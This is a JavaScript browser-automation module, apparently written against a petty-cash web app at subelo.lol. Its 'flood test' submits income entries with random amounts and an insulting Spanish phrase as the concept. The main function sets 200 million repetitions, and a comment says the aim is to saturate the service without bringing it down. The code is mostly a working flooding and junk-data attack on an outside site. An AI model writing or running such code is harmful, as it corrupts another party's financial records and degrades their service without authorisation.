const { sleep } = require('./human');

async function abrirCajaChica(page) {
  console.log('Navegando a Caja Chica...');

  await page.goto('https://subelo.lol/caja-chica', {
    waitUntil: 'domcontentloaded',
    timeout: 60000,
  });

  await page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => null);

  console.log(`URL actual: ${page.url()}`);
  return page;
}

async function probarConceptoFlood(page, repeticiones = 100) {
  console.log(`\n==============================`);
  console.log(`Prueba FLOOD: ${repeticiones} peticiones rápidas`);
  console.log(`==============================`);

  for (let i = 0; i < repeticiones; i++) {
    try {
      await page.evaluate(i => {
        function setReactInputValue(input, valor) {
          const nativeSetter = Object.getOwnPropertyDescriptor(
            window.HTMLInputElement.prototype,
            'value'
          ).set;
          nativeSetter.call(input, valor);
          input.dispatchEvent(new Event('input', { bubbles: true }));
        }

        const btnIngreso = [...document.querySelectorAll('button')]
          .find(b => b.textContent.trim() === '+ Ingreso');
        btnIngreso?.click();

        setTimeout(() => {
          const montoInput = document.querySelector('.fixed input[type="number"].inp');
          const conceptoInput = document.querySelector('.fixed input.inp[placeholder]');

          if (montoInput) setReactInputValue(montoInput, (Math.floor(Math.random() * 1000)).toString());
          if (conceptoInput) setReactInputValue(conceptoInput, 'Hijo de tu maldita madre ' + i);

          const btnGuardar = [...document.querySelectorAll('.fixed button')]
            .find(b => b.textContent.trim() === 'Guardar');
          btnGuardar?.click();
        }, 50);
      }, i);

      console.log(`→ Petición ${i + 1} enviada`);
      await sleep(100); // delay mínimo para no tumbar, solo saturar
    } catch (error) {
      console.error(`Falló la petición ${i + 1}:`, error.message);
      await page.keyboard.press('Escape').catch(() => {});
    }
  }

  console.log('\nFlood test terminado.');
}

async function ejecutarPruebaCajaChica(page) {
  await abrirCajaChica(page);

  // Aquí puedes correr el flood test
  await probarConceptoFlood(page, 200000000); // ajusta el número de repeticiones

  console.log('\nPruebas de Caja Chica terminadas.');
}

module.exports = {
  abrirCajaChica,
  probarConceptoFlood,
  ejecutarPruebaCajaChica,
};
